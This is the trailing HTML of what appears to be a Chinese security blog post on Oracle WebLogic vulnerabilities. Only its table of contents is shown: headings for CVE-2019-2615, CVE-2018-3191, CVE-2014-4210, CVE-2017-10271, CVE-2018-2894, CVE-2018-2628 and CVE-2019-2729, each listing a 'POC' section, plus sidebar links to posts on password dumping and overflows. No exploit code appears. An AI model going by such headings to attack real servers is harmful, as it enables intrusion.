href="#0x02-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%88CVE-2019-2615%EF%BC%89"><span class="toc-number">1.0.3.</span> <span class="toc-text">0x02 任意文件读取（CVE-2019-2615）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BD%8D%E7%BD%AE-1"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">漏洞位置:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85-1"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">漏洞详情:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F-1"><span class="toc-number">1.0.3.3.</span> <span class="toc-text">请求方式:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC-1"><span class="toc-number">1.0.3.4.</span> <span class="toc-text">POC:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2018-3191%EF%BC%89"><span class="toc-number">1.0.4.</span> <span class="toc-text">0x03  远程代码执行（CVE-2018-3191）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BD%8D%E7%BD%AE-2"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">漏洞位置:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85-2"><span class="toc-number">1.0.4.2.</span> <span class="toc-text">漏洞详情:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F-2"><span class="toc-number">1.0.4.3.</span> <span class="toc-text">请求方式:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC-2"><span class="toc-number">1.0.4.4.</span> <span class="toc-text">POC:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-Weblogic%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-4210%EF%BC%89"><span class="toc-number">1.0.5.</span> <span class="toc-text">0x04 Weblogic服务器端请求伪造漏洞（CVE-2014-4210）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85-3"><span class="toc-number">1.0.5.1.</span> <span class="toc-text">漏洞详情:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F-3"><span class="toc-number">1.0.5.2.</span> <span class="toc-text">请求方式:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC-3"><span class="toc-number">1.0.5.3.</span> <span class="toc-text">POC:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x05-WebLogicXMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-10271-amp-CVE-2017-3506%EF%BC%89"><span class="toc-number">1.0.6.</span> <span class="toc-text">0x05 WebLogicXMLDecoder反序列化漏洞（CVE-2017-10271&amp;CVE-2017-3506）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85-4"><span class="toc-number">1.0.6.1.</span> <span class="toc-text">漏洞详情:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F-4"><span class="toc-number">1.0.6.2.</span> <span class="toc-text">请求方式:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC-4"><span class="toc-number">1.0.6.3.</span> <span class="toc-text">POC:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x06-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2894%EF%BC%89"><span class="toc-number">1.0.7.</span> <span class="toc-text">0x06 Weblogic任意文件上传漏洞（CVE-2018-2894）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85-5"><span class="toc-number">1.0.7.1.</span> <span class="toc-text">漏洞详情:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F-5"><span class="toc-number">1.0.7.2.</span> <span class="toc-text">请求方式:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC-5"><span class="toc-number">1.0.7.3.</span> <span class="toc-text">POC:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x07-WeblogicWLS%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2628%EF%BC%89"><span class="toc-number">1.0.8.</span> <span class="toc-text">0x07 WeblogicWLS核心组件反序列化命令执行漏洞（CVE-2018-2628）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85-6"><span class="toc-number">1.0.8.1.</span> <span class="toc-text">漏洞详情:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F-6"><span class="toc-number">1.0.8.2.</span> <span class="toc-text">请求方式:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC-6"><span class="toc-number">1.0.8.3.</span> <span class="toc-text">POC:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x08-WebLogic%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%EF%BC%88CVE-2019-2729%EF%BC%89"><span class="toc-number">1.0.9.</span> <span class="toc-text">0x08 WebLogic远程命令执（CVE-2019-2729）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85-7"><span class="toc-number">1.0.9.1.</span> <span class="toc-text">漏洞详情:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F-7"><span class="toc-number">1.0.9.2.</span> <span class="toc-text">请求方式:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC-7"><span class="toc-number">1.0.9.3.</span> <span class="toc-text">POC:</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/06/09/WindowsGrabPassword/" title="Windows本地密码抓取"><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/127.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows本地密码抓取"/></a><div class="content"><a class="title" href="/2021/06/09/WindowsGrabPassword/" title="Windows本地密码抓取">Windows本地密码抓取</a><time datetime="2021-06-09T15:45:42.000Z" title="发表于 2021-06-09 23:45:42">2021-06-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/18/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/" title="蔓灵花APT组织针对巴基斯坦定向攻击的样本分析"><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/126.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蔓灵花APT组织针对巴基斯坦定向攻击的样本分析"/></a><div class="content"><a class="title" href="/2021/05/18/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/" title="蔓灵花APT组织针对巴基斯坦定向攻击的样本分析">蔓灵花APT组织针对巴基斯坦定向攻击的样本分析</a><time datetime="2021-05-18T15:45:42.000Z" title="发表于 2021-05-18 23:45:42">2021-05-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/04/HeapOverflow_Linux_0x01/" title="Linux堆溢出总结（0x01）"><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/123.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux堆溢出总结（0x01）"/></a><div class="content"><a class="title" href="/2021/05/04/HeapOverflow_Linux_0x01/" title="Linux堆溢出总结（0x01）">Linux堆溢出总结（0x01）</a><time datetime="2021-05-04T15:45:42.000Z" title="发表于 2021-05-04 23:45:42">2021-05-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/26/StackOverflow_Linux_0x03/" title="Linux栈溢出总结（0x03）"><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/122.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux栈溢出总结（0x03）"/></a><div class="content"><a class="title" href="/2021/03/26/StackOverflow_Linux_0x03/" title="Linux栈溢出总结（0x03）">Linux栈溢出总结（0x03）</a><time datetime="2021-03-26T10:45:42.000Z" title="发表于 2021-03-26 18:45:42">2021-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/27/OfficeExcelMacro/" title="Office Excel Macro"><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/121.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Office Excel Macro"/></a><div class="content"><a class="title" href="/2021/01/27/OfficeExcelMacro/" title="Office Excel Macro">Office Excel Macro</a><time datetime="2021-01-27T10:45:42.000Z" title="发表于 2021-01-27 18:45:42">2021-01-27</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2017 - 2021 By ascotbe</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function loadUtterances () {
+  let ele = document.createElement('script')
+  ele.setAttribute('id', 'utterances_comment')
+  ele.setAttribute('src', 'https://utteranc.es/client.js')
+  ele.setAttribute('repo', 'Ascotbe/Ascotbe.github.io')
+  ele.setAttribute('issue-term', 'pathname')
+  let nowTheme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'photon-dark' : 'github-light'
+  ele.setAttribute('theme', nowTheme)
+  ele.setAttribute('crossorigin', 'anonymous')
+  ele.setAttribute('async', 'true')
+  document.getElementById('utterances-wrap').insertAdjacentElement('afterbegin',ele)
+}
+
+function utterancesTheme () {
+  if (document.querySelector('.utterances-frame')) {
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'photon-dark' : 'github-light'
+    const message = {
+      type: 'set-theme',
+      theme: theme
+    };
+    const iframe = document.querySelector('.utterances-frame');
+    iframe.contentWindow.postMessage(message, 'https://utteranc.es');
+  }
+}
+
+if ('Utterances' === 'Utterances' || !true) {
+  if (true) btf.loadComment(document.getElementById('utterances-wrap'), loadUtterances)
+  else loadUtterances()
+} else {
+  function loadOtherComment () {
+    loadUtterances()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/Bronya.model.json"},"display":{"position":"right","width":400,"height":500,"hOffset":-90,"vOffset":0},"mobile":{"show":false},"log":false});</script></body></html>
